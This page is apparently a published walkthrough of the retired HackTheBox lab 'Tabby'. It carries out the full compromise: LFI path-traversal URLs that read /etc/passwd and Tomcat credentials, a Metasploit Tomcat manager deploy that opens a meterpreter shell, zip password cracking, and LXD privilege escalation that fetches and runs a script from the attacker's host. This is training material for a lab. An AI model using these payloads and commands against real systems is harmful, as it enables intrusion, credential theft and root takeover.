@@ -1,0 +1,103 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Tabby HacktheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/tabby-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-01-06T18:00:56+00:00">January 6, 2021</time><time class="updated" datetime="2025-06-10T20:18:24+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today, we’re sharing another Hack the box Challenge Walkthrough box: Tabby and the machine is part of the retired lab, so you can connect to the machine using your HTB VPN and then start to solve the CTF.</span></p>
+<p><span style="color: #000000;"><em>The level of the Lab is set: Beginner to intermediate.</em></span></p>
+<p><span style="color: #000000;"><em>Task: Capture the user.txt and root.txt flags.</em></span></p>
+<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
+<p><strong><span style="color: #000000;">Network Scanning</span></strong></p>
+<ul>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+<p><strong><span style="color: #000000;">Enumeration</span></strong></p>
+<ul>
+<li><span style="color: #000000;">LFI</span></li>
+</ul>
+<p><strong><span style="color: #000000;">Exploit</span></strong></p>
+<ul>
+<li><span style="color: #000000;">Tomcat Manager Deploy using Metasploit</span></li>
+</ul>
+<p><strong><span style="color: #000000;">Privilege Escalation</span></strong></p>
+<ul>
+<li><span style="color: #000000;">Lxd | Lxc</span></li>
+</ul>
+<h3><span style="color: #800000;"><strong><u>Walkthrough </u></strong></span></h3>
+<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
+<p><span style="color: #000000;">As we know the victim’s machine IP thus, we can start with Nmap scanning to identify the open ports and services running across it.</span></p>
+<pre class="lang:default decode:true">nmap -sC -sV 10.129.5.1</pre>
+<p><span style="color: #000000;">We found ports 22,80 &amp; 8080 are open for SSH, HTTP, and Tomcat respectively.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oumHzu6iFvo/X_X4AGEEHaI/AAAAAAAAslQ/x9epHBad_G00-lGQpW69LsD4XQ_LZWXaQCLcBGAsYHQ/s16000/1.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;">We explore the IP inside the web browser but unfortunately did not find any clue.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XIwxiK3jd_U/X_X4DkqEFPI/AAAAAAAAslU/8Gq5iv2pOQQQ_uEDNkanoY-AZwAkBbDSgCLcBGAsYHQ/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">Then we have edited the /etc/hosts file by adding IP and domain name as highlighted in the image.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9FyfYDyz72c/X_X4HQovIsI/AAAAAAAAslY/y-Ld2uLYbwcZW9QisjNbpCiuWjfwVU6nwCLcBGAsYHQ/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">Then we try to browse the DNS name “megahosting.htb” and navigate to the News tab. Here I notice the URL contains a “file” parameter that indicates a possibility for LFI.</span></p>
+<p><span style="color: #000000;">Let’s check it …………………….</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oGQpsiliwCo/X_X4K10J3PI/AAAAAAAAslc/IK3q678j0u8qsiBLirG3HG4AyaKPhv_BwCLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">Thus, I try to execute the following URL and obtained the records /etc/passwd file on the web browser as output.</span></p>
+<pre class="lang:default decode:true">http://megahosting.htb/news.php?file=../../../../etc/passwd</pre>
+<p><span style="color: #000000;">The password file has a user account named ash.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Y13WxwhBP5k/X_X4OnpqujI/AAAAAAAAslg/BTG5I4r3ShgrLC2OWCpdwsCbDtV-Q68XwCLcBGAsYHQ/s16000/5.png"/></span></p>
+<p><span style="color: #000000;">As you know port 8080 was open for tomcat when I navigate to <strong>http://megagosting.htb:8080</strong> I notice a path for user.xml at the end of the page.</span></p>
+<p><span style="color: #000000;">Hmmm! As we know the machine is vulnerable to LFI, so we can try to access the user.xml through the web browser for tomcat login authentication.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kIVCJv7CxYc/X_X4SxBBLiI/AAAAAAAAslk/cfboaPt7Z4EmZYCVxSX8W1eS1_QjewjagCLcBGAsYHQ/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">Thus, I explored source code in the following URL:</span></p>
+<pre class="lang:default decode:true">http://megahosting.htb/news.php?file=../../../../../../usr/share/tomcat9/etc/tomcat-users.xml</pre>
+<p><span style="color: #000000;">As it is the user.xml configuration file that has tomcat authentication login credential.</span></p>
+<pre class="lang:default decode:true">Username: tomcat
+Password: $3cureP4s5w0rd123!</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_SZ70ytibQM/X_X4Z5Z9qKI/AAAAAAAAslw/7ogzySV6TWAMrxWr0Y1SfQkWjV7OXAsHQCLcBGAsYHQ/s16000/7.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
+<p><span style="color: #000000;">Without wasting time, I load the Metasploit framework and run the following exploit by providing the following inputs.</span></p>
+<pre class="lang:default decode:true">msf &gt; use exploit/multi/http/tomcat_mgr_deploy
+msf exploit(tomcat_mgr_deploy) &gt; set rhosts 10.129.5.1
+msf exploit(tomcat_mgr_deploy) &gt; set report 8080
+msf exploit(tomcat_mgr_deploy) &gt; set httpusername tomcat
+msf exploit(tomcat_mgr_deploy) &gt; set httppassword $3cureP4s5w0rd123!
+msf exploit(tomcat_mgr_deploy) &gt; set path /manager/text
+msf exploit(tomcat_mgr_deploy) &gt; set lhost 10.10.14.52
+msf exploit(tomcat_mgr_deploy) &gt; set target 1
+msf exploit(tomcat_mgr_deploy) &gt; run</pre>
+<p><span style="color: #000000;">Booom!! We have the meterpreter session of the machine, let’s enumerate further and try to get the 1<sup>st</sup> flag.</span></p>
+<p><span style="color: #000000;">I navigate to /var/www/html and found a “files” folder.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CSeYbMPlcbc/X_X4dtreXOI/AAAAAAAAsl4/75gOIgoUTUgmMYMMCgfrkEo66A2Pxz-NQCLcBGAsYHQ/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">Inside /file directory, it holds a zip file for backup that I transfer to my local machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-t3LN4RFbCTk/X_X4h2qOJPI/AAAAAAAAsl8/97TBMPNlx9oAIP5Xs_8LddvdWITTNLT9wCLcBGAsYHQ/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">This was a password-protected zip file and by using RockYou dictionary I try to crack the password with the help of fcrackzip tool.  Thus, I found the password “admin@it” and with the help of this, I extracted the zip file. </span></p>
+<pre class="lang:default decode:true">fcrackzip -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip
+unzip 16162020_backup.zip</pre>
+<p><span style="color: #000000;">Lol!!! It holds nothing, here the author tried to make us fool.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LAT2KRqC-WQ/X_X4levbsfI/AAAAAAAAsmE/el8OycYpggYXVfRTRughklhYYN-I0gJhACLcBGAsYHQ/s16000/10.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p><span style="color: #000000;">As we found a username account “Ash” in the /etc/passwd file thus I used the above-enumerated password for login as Ash and found the 1<sup>st</sup> flag in the user.txt, then I check for user id and noticed Ash is a member lxd group.</span></p>
+<p><span style="color: #000000;"><strong>Note:</strong><em> In our article LXD privilege escalation we have discussed how to escalate the root privilege by exploiting lxd | lxc. </em></span></p>
+<p><span style="color: #000000;">Read the article from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/lxd-privilege-escalation/">here</a></strong></span></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DmiQKnWOFeQ/X_X4o9vxrsI/AAAAAAAAsmI/Ex7X3KcuTs0tttuWBiQFeigISCyIp_0bQCLcBGAsYHQ/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">But I am going to use another method for exploiting the given permissions. You can find the lxd privilege escalation exploit from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.exploit-db.com/exploits/46978">here</a> </strong></span>and follow the steps mention below.</span></p>
+<p><span style="color: #000000;">Step 1: Download the alpine in your attacking machine</span></p>
+<pre class="lang:default decode:true">wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine</pre>
+<p><span style="color: #000000;">Step 2: Run the following command to build the package</span></p>
+<pre class="lang:default decode:true">bash build-alpine</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gwu3WNnaUn4/X_X4sx5tEYI/AAAAAAAAsmQ/orWm3oU8GncMGkqguUOSEcMGWVHExHw4ACLcBGAsYHQ/s16000/14.png"/></span></p>
+<p><span style="color: #000000;">Step 3: Save the <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.exploit-db.com/exploits/46978">exploit</a> </strong></span>in a file “raj. sh” and then transfer the package and bash script to the target machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1E0DdJMuywY/X_X4xSIfXgI/AAAAAAAAsmY/RmDvzUB7mPU7kSZ4CNcjWvaZlXsN-SCRwCLcBGAsYHQ/s16000/15.png"/></span></p>
+<pre class="lang:default decode:true">wget 10.10.14.52:8000/alpine-v3.12-x86_64-20210104_1537.tar.gz
+wget 10.10.14.52:8000/raj.sh
+chmod 777 raj.sh
+./raj.sh -f alpine-v3.12-x86_64-20210104_1537.tar.gz
+id</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-E6DwZI4TktI/X_X40kS0udI/AAAAAAAAsmg/Hkw5RLEnrhoJhHMLObNlmHi3pKtVGWCoACLcBGAsYHQ/s16000/16.png"/></span></p>
+<pre class="lang:default decode:true">cd /mnt/root/root
+cat root.txt</pre>
+<p><span style="color: #000000;">Boom! We got the final flag and complete task 😊</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KSwaUrXHY6o/X_X44K08gOI/AAAAAAAAsmo/VvfXL-GGiR4xw2FyR0JyupWsRkWLQ-kLgCLcBGAsYHQ/s16000/17.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Varsha Rohith is an ardent cybersecurity enthusiast and technical writer at Hacking Articles. <strong><a style="color: #000000;" href="https://www.linkedin.com/in/varsha-rohith/">LinkedIn</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
